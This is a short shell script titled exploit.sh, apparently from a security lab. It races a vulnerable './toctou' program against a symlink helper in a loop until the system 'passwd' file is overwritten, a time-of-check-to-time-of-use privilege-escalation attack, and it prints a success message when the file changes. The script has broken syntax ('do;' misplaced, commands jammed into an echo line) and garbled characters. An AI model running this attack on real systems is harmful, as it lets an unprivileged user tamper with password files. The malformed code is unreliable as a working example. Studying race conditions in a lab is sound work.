#!/bin/sh 
# exploit.sh 
old=`ls -l passwd` 
new=`ls -l passwd` 
while [ "$old" = "$new" ] do;
    rm passwdlocal
    echo "This is a file that the user can overwrite" > passwdlocal 
    echo "TOCTOU-Attack-Success" ./toctou passwdlocal & ./symlink passwdlocal & new=`ls -l passwd` 
done

echo "STOPâ€¦ The passwd file has been changed"
